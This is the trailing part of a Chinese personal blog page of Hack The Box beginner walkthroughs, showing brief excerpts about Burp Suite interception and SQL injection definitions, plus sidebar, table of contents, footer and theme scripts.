找一下登录页面。这里要用到bp抓包（task1就提示了代理，代理对应着抓包），因为我的bp在kali上是社区版（最新版还没有破解版），所以这次我用了win环境来做(仅限抓包)。（win环境下我有bp专业版），先bp抓一下包：   然后我们在目标的配置文件里找到了Login的路径（login的js脚本）：   1/cdn-cgi/login  task3:12What can...</div></div></div></a><a class="pagination-related" href="/2026/08/15/hack-the-box-tier1-Appointment/" title="hack the box tier1 Appointment"><img class="cover" src="https://picsum.photos/1920/1080?random=2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hack the box tier1 Appointment</div></div><div class="info-2"><div class="info-item-1">HTB WP -Appointmenttask1:12What does the acronym SQL stand for?SQL 这个缩写代表什么意思？  回答： 1Structured Query Language  task2:12What is one of the most common type of SQL vulnerabilities?最常见的 SQL 漏洞类型之一是什么？  回答： 1SQL Injection，就是SQL注入，攻击者通过在输入框中恶意输入 SQL 代码，来骗过数据库服务器，从而窃取、篡改数据，甚至直接控制整个系统。  task3:12What is the 2021 OWASP Top 10 classification for this vulnerability?这种漏洞在 2021 版 OWASP Top 10 中的分类是什么？  回答： 1A03:2021-Injection  task4:12What does Nmap report as the service and version that are running on p...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">joke</div><div class="author-info-description">来摆烂ing</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/simple9656"><i class="fab fa-github"></i><span>click me</span></a><div class="card-info-social-icons"><a class="social-icon" href="/h" target="_blank" title=""><i></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="1"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="2"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="3"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="4"></i></a><a class="social-icon" href="/:" target="_blank" title=""><i class="5"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="6"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="7"></i></a><a class="social-icon" href="/g" target="_blank" title=""><i class="8"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="9"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="10"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="11"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="12"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="13"></i></a><a class="social-icon" href="/." target="_blank" title=""><i class="14"></i></a><a class="social-icon" href="/c" target="_blank" title=""><i class="15"></i></a><a class="social-icon" href="/o" target="_blank" title=""><i class="16"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="17"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="18"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="19"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="20"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="21"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="22"></i></a><a class="social-icon" href="/l" target="_blank" title=""><i class="23"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="24"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="25"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="26"></i></a><a class="social-icon" href="/5" target="_blank" title=""><i class="27"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="28"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="29"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="30"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="31"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="32"></i></a><a class="social-icon" href="/G" target="_blank" title=""><i class="33"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="34"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="35"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="36"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="37"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="38"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="39"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="40"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="41"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="42"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="43"></i></a><a class="social-icon" href="#" target="_blank" title=""><i class="44"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="45"></i></a><a class="social-icon" href="/4" target="_blank" title=""><i class="46"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="47"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="48"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="49"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="50"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="51"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">你是我生命里的意外惊喜，不需要言语，却能治愈我所有的疲惫。每一次低落，都是因为你，我才重新找到力量。你是我不曾预料的温暖，直接击中心脏。你，是我的全世界。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-WP-Archetype"><span class="toc-number">1.</span> <span class="toc-text">HTB WP -Archetype</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#task1"><span class="toc-number">1.1.</span> <span class="toc-text">task1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task2"><span class="toc-number">1.2.</span> <span class="toc-text">task2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task3"><span class="toc-number">1.3.</span> <span class="toc-text">task3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task4"><span class="toc-number">1.4.</span> <span class="toc-text">task4:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task5"><span class="toc-number">1.5.</span> <span class="toc-text">task5:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task6"><span class="toc-number">1.6.</span> <span class="toc-text">task6:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task7"><span class="toc-number">1.7.</span> <span class="toc-text">task7:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/hack-the-box-tier2-Vaccine/" title="hack the box tier2 Vaccine"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack the box tier2 Vaccine"/></a><div class="content"><a class="title" href="/2026/08/15/hack-the-box-tier2-Vaccine/" title="hack the box tier2 Vaccine">hack the box tier2 Vaccine</a><time datetime="2026-08-14T20:07:10.000Z" title="发表于 2026-08-15 04:07:10">2026-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/hack-the-box-tier2-Oopsie/" title="hack the box tier2 Oopsie"><img src="https://picsum.photos/1920/1080?random=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack the box tier2 Oopsie"/></a><div class="content"><a class="title" href="/2026/08/15/hack-the-box-tier2-Oopsie/" title="hack the box tier2 Oopsie">hack the box tier2 Oopsie</a><time datetime="2026-08-14T20:04:22.000Z" title="发表于 2026-08-15 04:04:22">2026-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/hack-the-box-tier2-Archetype/" title="hack the box tier2 Archetype"><img src="https://picsum.photos/1920/1080?random=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack the box tier2 Archetype"/></a><div class="content"><a class="title" href="/2026/08/15/hack-the-box-tier2-Archetype/" title="hack the box tier2 Archetype">hack the box tier2 Archetype</a><time datetime="2026-08-14T20:01:26.000Z" title="发表于 2026-08-15 04:01:26">2026-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/hack-the-box-tier1-Appointment/" title="hack the box tier1 Appointment"><img src="https://picsum.photos/1920/1080?random=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack the box tier1 Appointment"/></a><div class="content"><a class="title" href="/2026/08/15/hack-the-box-tier1-Appointment/" title="hack the box tier1 Appointment">hack the box tier1 Appointment</a><time datetime="2026-08-14T19:58:48.000Z" title="发表于 2026-08-15 03:58:48">2026-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/15/hack-the-box-tier1-Crocodile/" title="hack the box tier1 Crocodile"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hack the box tier1 Crocodile"/></a><div class="content"><a class="title" href="/2026/08/15/hack-the-box-tier1-Crocodile/" title="hack the box tier1 Crocodile">hack the box tier1 Crocodile</a><time datetime="2026-08-14T19:56:05.000Z" title="发表于 2026-08-15 03:56:05">2026-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By joke</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div><div class="footer_custom_text">你和我的一切有关</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.44/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/random_bg.js"></script><script src="/js/sakura.js"></script><script src="/js/music_card.js"></script><script src="/js/runtime.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章喵...hhh你找到我了吗" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.9},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
